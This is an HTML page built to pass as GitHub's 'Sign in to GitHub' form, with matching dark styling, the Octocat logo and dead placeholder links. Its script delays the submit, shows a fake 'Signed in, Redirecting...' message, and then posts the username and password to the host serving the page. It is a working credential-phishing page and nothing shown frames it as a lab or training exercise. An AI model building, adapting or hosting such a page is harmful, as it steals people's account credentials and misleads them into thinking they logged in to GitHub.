<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub · GitHub</title>
    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
    
    <style>
        /* --- GITHUB DARK THEME VARIABLES --- */
        :root {
            --bg-color: #0d1117;
            --card-bg: #161b22;
            --border-color: #30363d;
            --text-main: #c9d1d9;
            --text-white: #ffffff;
            --link-color: #58a6ff;
            --btn-bg: #238636;
            --btn-hover: #2ea043;
            --input-bg: #0d1117;
            --input-border: #30363d;
            --focus-border: #1f6feb;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-main);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            font-size: 14px;
        }

        /* --- LOGO --- */
        .logo-container {
            padding-bottom: 24px;
            text-align: center;
        }
        .octocat {
            fill: var(--text-white);
            height: 48px;
            width: 48px;
        }

        .heading {
            font-size: 24px;
            font-weight: 300;
            letter-spacing: -0.5px;
            color: var(--text-white);
            margin-bottom: 15px;
            text-align: center;
        }

        /* --- CARD STYLE --- */
        .auth-form-body {
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 20px;
            width: 100%;
            max-width: 310px;
            margin-bottom: 15px;
        }

        /* --- INPUTS --- */
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 400;
            color: var(--text-main);
        }

        .input-block {
            width: 100%;
            background-color: var(--input-bg);
            border: 1px solid var(--input-border);
            border-radius: 6px;
            padding: 5px 12px;
            font-size: 14px;
            line-height: 20px;
            color: var(--text-main);
            outline: none;
            margin-bottom: 15px;
            height: 32px;
            transition: 0.2s;
            box-shadow: inset 0 1px 0 rgba(0,0,0,0.1);
        }

        .input-block:focus {
            border-color: var(--link-color);
            box-shadow: 0 0 0 3px rgba(31, 111, 235, 0.3);
        }

        /* Password Header Wrapper (Label + Link) */
        .password-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .forgot-link {
            color: var(--link-color);
            text-decoration: none;
            font-size: 12px;
        }
        .forgot-link:hover { text-decoration: underline; }

        /* --- BUTTON --- */
        .btn-green {
            width: 100%;
            background-color: var(--btn-bg);
            color: #fff;
            border: 1px solid rgba(240,246,252,0.1);
            border-radius: 6px;
            padding: 5px 16px;
            font-size: 14px;
            font-weight: 600;
            line-height: 20px;
            cursor: pointer;
            height: 35px;
            position: relative;
        }
        .btn-green:hover { background-color: var(--btn-hover); }
        .btn-green:disabled { opacity: 0.6; cursor: default; }

        /* --- SPINNER --- */
        .spinner {
            display: none;
            width: 16px; height: 16px;
            border: 2px solid rgba(255,255,255,0.4);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
        }
        @keyframes spin { to { transform: translate(-50%, -50%) rotate(360deg); } }

        /* --- FOOTER --- */
        .create-acc-box {
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 15px 20px;
            text-align: center;
            width: 100%;
            max-width: 310px;
            font-size: 14px;
            margin-bottom: 40px;
        }
        .create-acc-box a { color: var(--link-color); text-decoration: none; }
        .create-acc-box a:hover { text-decoration: underline; }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 15px;
            font-size: 12px;
            color: #8b949e;
        }
        .footer-links a { color: var(--link-color); text-decoration: none; }
        .footer-links a:hover { text-decoration: underline; }

        /* --- SUCCESS STATE --- */
        .success-view {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .check-icon { font-size: 40px; color: var(--btn-bg); margin-bottom: 10px; }

        /* --- ERROR --- */
        .error-box {
            background-color: rgba(248,81,73,0.1);
            border: 1px solid rgba(248,81,73,0.4);
            border-radius: 6px;
            padding: 10px;
            margin-bottom: 15px;
            color: #ff7b72;
            font-size: 13px;
            display: none;
            align-items: center;
        }

        /* --- MOBILE --- */
        @media (max-width: 400px) {
            .auth-form-body, .create-acc-box { border: none; background: transparent; padding: 10px 0; }
            body { justify-content: flex-start; padding-top: 40px; }
        }

    </style>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('loginForm');
            const userIn = document.getElementById('login_field');
            const passIn = document.getElementById('password');
            const btn = document.getElementById('submitBtn');
            const btnText = document.getElementById('btnText');
            const spinner = document.getElementById('spinner');
            const formInputs = document.getElementById('formInputs');
            const successView = document.getElementById('successView');
            const errorBox = document.getElementById('errorBox');

            form.addEventListener('submit', function(e) {
                // 1. Stop normal submit
                e.preventDefault();
                errorBox.style.display = 'none';

                // Basic Check
                if (!userIn.value || !passIn.value) {
                    errorBox.style.display = 'block';
                    errorBox.textContent = "Incorrect username or password.";
                    return;
                }

                // 2. Loading
                btn.disabled = true;
                btnText.style.display = 'none';
                spinner.style.display = 'block';

                // 3. Fake Delay & Success
                setTimeout(() => {
                    // Hide Inputs
                    formInputs.style.display = 'none';
                    // Show Success
                    successView.style.display = 'flex';

                    // 4. Send Data to /login
                    setTimeout(() => {
                        form.submit();
                    }, 2000);

                }, 1500);
            });
        });
    </script>
</head>
<body>

    <div class="logo-container">
        <svg class="octocat" viewBox="0 0 16 16" version="1.1" aria-hidden="true">
            <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
        </svg>
    </div>

    <div class="heading">Sign in to GitHub</div>

    <div class="auth-form-body">
        
        <form id="loginForm" action="/login" method="POST">
            
            <div id="errorBox" class="error-box"></div>

            <div id="formInputs">
                <label for="login_field">Username or email address</label>
                <input type="text" name="login" id="login_field" class="input-block" autofocus="autofocus" autocomplete="username">

                <div class="password-header">
                    <label for="password">Password</label>
                    <a href="#" class="forgot-link">Forgot password?</a>
                </div>
                <input type="password" name="password" id="password" class="input-block" autocomplete="current-password">

                <button type="submit" id="submitBtn" class="btn-green">
                    <span id="btnText">Sign in</span>
                    <div id="spinner" class="spinner"></div>
                </button>
            </div>

            <div id="successView" class="success-view">
                <div class="check-icon">✓</div>
                <h3 style="color: #c9d1d9; font-weight: 500;">Signed in</h3>
                <p style="color: #8b949e; margin-top: 5px;">Redirecting...</p>
            </div>

        </form>
    </div>

    <div class="create-acc-box">
        New to GitHub? <a href="#">Create an account</a>.
    </div>

    <div class="footer-links">
        <a href="#">Terms</a>
        <a href="#">Privacy</a>
        <a href="#">Docs</a>
        <a href="#">Contact GitHub Support</a>
    </div>

</body>
</html>
